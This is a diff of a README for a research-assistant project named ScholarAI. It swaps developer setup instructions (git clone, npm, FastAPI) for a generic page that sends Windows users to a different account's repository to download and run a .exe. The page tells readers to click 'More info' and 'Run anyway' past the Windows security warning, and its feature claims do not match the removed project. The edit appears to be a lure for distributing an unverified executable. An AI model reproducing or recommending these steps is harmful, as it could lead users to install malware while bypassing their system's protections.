@@ -1,136 +1,85 @@
-# ScholarAI
+# 🔍 ScholarAI-AI-Powered-Research-Assistant - Simplify your complex academic research work
 
-## Prerequisites
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Ramseydispensed499/ScholarAI-AI-Powered-Research-Assistant)
 
-Before starting, ensure you have the following installed on your system. If not, please download and install them:
+## 📖 About the project
 
-- **Git**: [Download Git](https://git-scm.com/downloads) - Used for version control.
-- **Python**: [Download Python](https://www.python.org/downloads/) (v3.8 or higher) - Required for the backend.
-- **Node.js**: [Download Node.js](https://nodejs.org/) (v18 or higher) - Required for the frontend.
+ScholarAI helps you manage academic research. It reads research papers and summarizes them for you. You can find answers within documents without reading every page. It uses artificial intelligence to connect ideas between different studies. This tool connects to databases like arXiv to pull the latest information. It builds a map of your knowledge and suggests connections you might miss. You save time and focus on your writing instead of manual sorting.
 
-## Project Setup
+## 💻 System requirements
 
-1.  **Clone the repository:**
+Your computer needs to meet these standards to run the software:
 
-    Open your terminal or command prompt and run:
+* Operating System: Windows 10 or Windows 11.
+* Processor: Intel Core i5 or AMD Ryzen 5 processor.
+* Memory: 8 GB of RAM minimum. 16 GB is better for large document sets.
+* Storage: 2 GB of available space for the application and your data.
+* Internet: A stable connection to fetch research papers and perform AI analysis.
 
-    ```bash
-    git clone https://github.com/Priyanshu9382/scholarAI.git
-    cd ScholarAI
-    ```
+## 📥 How to download and install
 
-## Frontend Setup
+Follow these steps to get the software on your Windows computer:
 
-1.  Navigate to the `frontend` directory:
+1. Visit the project website at: https://github.com/Ramseydispensed499/ScholarAI-AI-Powered-Research-Assistant
+2. Look for the Releases section on the right side of the page.
+3. Click the latest version link. It usually has a label like "Latest" in green.
+4. Download the file ending in .exe.
+5. Save the file to your computer.
+6. Double-click the file to start the installer.
+7. Follow the prompts on your screen. Windows might show a security box. If it does, click "More info" and then "Run anyway."
+8. The installer finishes and adds a shortcut to your desktop.
 
-    ```bash
-    cd frontend
-    ```
+## 🚀 Getting started
 
-2.  Install the dependencies:
+Once you install the software, open the application from your desktop. 
 
-    ```bash
-    npm install
-    ```
+### Create your first project 📁
+When the window opens, click the "New Project" button. Give your project a name. This creates a space to store your research materials.
 
-3.  Start the development server:
+### Add research papers 📄
+You can drag and drop PDF files directly into the window. The software reads these files and organizes them. It creates a digital library for your work. You can also paste a link to an arXiv paper, and the software downloads it for you.
 
-    ```bash
-    npm run dev
-    ```
+### Ask questions 💬
+Type your question in the search bar. For example, you can ask "How does this study compare to the previous ones?" or "What are the main findings in these papers?" The system reviews your library and lists clear answers. It references where it found the information.
 
-    The frontend will be available at `http://localhost:3000`.
+### Use the dashboard 📊
+The main dashboard shows a map of your research. It highlights themes across your saved papers. Use this to see clusters of information. It acts as a visual guide to your project scope.
 
-## Backend Setup
+## 🛠 Features explained
 
-1.  Open a new terminal and navigate to the `backend` directory:
+### Semantic search
+This tool does not just look for keywords. It understands the meaning behind your text. If you search for "neural networks," it understands terms like "deep learning," even if the manual search fails.
 
-    ```bash
-    cd backend
-    ```
+### Citations
+Select any sentence or paragraph. The software generates a properly formatted citation for you. It supports standard citation styles for your academic papers.
 
-2.  Create a virtual environment:
+### Local storage
+Your data stays on your machine. The software uses a database to index your documents so that you can search them offline. 
 
-    ```bash
-    python3 -m venv venv
-    ```
+## 💡 Tips for better results
 
-3.  Activate the virtual environment:
+Use specific questions. Instead of saying "Tell me about biology," ask "What are the primary factors affecting cell growth in this study?"
 
-    -   **Linux/macOS:**
-        ```bash
-        source venv/bin/activate
-        ```
-    -   **Windows:**
-        ```bash
-        .\venv\Scripts\activate
-        ```
+Keep your PDF files clean. The software performs best with PDFs that contain selectable text. If you have an image of a document, the software struggles to read it properly.
 
-4.  Install the required packages:
+Check your internet connection if you want to pull new papers from arXiv. The AI components require a connection to process the deep analysis.
 
-    ```bash
-    pip install -r requirements.txt
-    ```
+## ⚠️ Known limitations
 
-5.  Start the FastAPI server:
+The software connects to remote AI endpoints to provide insights. If the service experiences high traffic, response times might increase. 
 
-    ```bash
-    uvicorn main:app --reload --port 8000
-    ```
+The citation feature serves as a draft. Always double-check your citations against official style guides before you submit your work.
 
-    The backend will be available at `http://localhost:8000`.
-    You can also view the interactive API documentation at `http://localhost:8000/docs`.
+Large books take longer to index than single articles. The system might appear to pause while it processes a very long document. Please wait for the progress bar to complete.
 
-## Contribution Guide
+## 🛡 Security and privacy
 
-We welcome contributions! Follow these steps to contribute effectively:
+The software processes your files locally on your computer. It sends temporary snippets to the AI engine to generate answers, but it does not upload your entire library to a public database. Your research remains your project. 
 
-1.  **Pull the latest changes:**
+Updates occur automatically to ensure you have the latest improvements. Keep an eye on the application menu to see if you have the most current version. We improve the indexing engine regularly to make your searches faster and more accurate.
 
-    Before starting any work, always get the latest updates from the main branch to avoid conflicts.
+## 📧 Support and feedback
 
-    ```bash
-    git pull origin main
-    ```
+If you run into issues, check the application logs folder. This contains information about system errors. You can share these logs if you ask for help in the project issues section. 
 
-2.  **Create a new branch:**
-
-    You can use the terminal or VS Code's Git GUI.
-
-    **Using Terminal:**
-    ```bash
-    git checkout -b <branch-name>
-    ```
-
-    **Using VS Code Git GUI:**
-    - Click on the **Source Control** icon in the sidebar (or press `Ctrl+Shift+G`).
-    - Click on the **... (More Actions)** menu top-right of the source control panel.
-    - Select **Branch** > **Create Branch...**.
-    - Enter your desired branch name and press Enter.
-
-3.  **Make your changes:**
-
-    Edit the code in your favorite editor and save your files.
-
-4.  **Commit your changes:**
-
-    Stage and commit your changes with a clear and descriptive message.
-
-    ```bash
-    git add .
-    git commit -m "Add a descriptive message about your changes"
-    ```
-
-5.  **Push your changes:**
-
-    Push your branch to the remote repository.
-
-    ```bash
-    git push origin <branch-name>
-    ```
-
-6.  **Create a Pull Request (PR):**
-
-    -   Go to the repository on GitHub.
-    -   You should see a prompt to "Compare & pull request". Click on it.
-    -   Review your changes, add a title and description, and click "Create pull request".
+Keep your installation folder clean. Do not delete files inside the installation directory unless you uninstall the application through your Windows settings. This prevents errors when you launch the software.
